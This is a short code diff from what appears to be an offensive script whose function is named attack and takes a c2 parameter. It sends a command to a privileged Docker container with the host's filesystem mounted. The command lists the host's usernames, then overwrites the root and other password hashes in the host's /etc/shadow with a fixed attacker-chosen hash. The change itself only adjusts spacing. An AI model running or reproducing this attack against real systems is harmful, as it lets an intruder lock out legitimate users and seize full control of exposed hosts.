@@ -21,7 +21,7 @@ def attack(target, port, containerID, c2):
         "AttachStdin": True,
         "AttachStdout": True,
         "AttachStderr": True,
-        "Cmd": ["/bin/sh", "-c", "cat /host/etc/passwd | grep -oE '^[^:]+' | tr '\\n' ' ' && sed -i -e 's/root:*[^:]\+:/root:$6$ilDk.19ZUBhQbxkA$6rv9s1sJcecVNwwW2V9uEl4QlJ\/V0d5JK\/lXAAdSUF7W3b2oGmp37I2qm.2iNGt.JXqKdoW4oGHaUSgABP5vA.:/' /host/etc/shadow&& sed -i -e 's/:$6[^:]\+:/:$6$ilDk.19ZUBhQbxkA$6rv9s1sJcecVNwwW2V9uEl4QlJ\/V0d5JK\/lXAAdSUF7W3b2oGmp37I2qm.2iNGt.JXqKdoW4oGHaUSgABP5vA.:/' /host/etc/shadow"],
+        "Cmd": ["/bin/sh", "-c", "cat /host/etc/passwd | grep -oE '^[^:]+' | tr '\\n' ' ' && sed -i -e 's/root:*[^:]\+:/root:$6$ilDk.19ZUBhQbxkA$6rv9s1sJcecVNwwW2V9uEl4QlJ\/V0d5JK\/lXAAdSUF7W3b2oGmp37I2qm.2iNGt.JXqKdoW4oGHaUSgABP5vA.:/' /host/etc/shadow && sed -i -e 's/:$6[^:]\+:/:$6$ilDk.19ZUBhQbxkA$6rv9s1sJcecVNwwW2V9uEl4QlJ\/V0d5JK\/lXAAdSUF7W3b2oGmp37I2qm.2iNGt.JXqKdoW4oGHaUSgABP5vA.:/' /host/etc/shadow"],
         "DetachKeys": "ctrl-p,ctrl-q",
         "Privileged": True,
         "Tty": True,
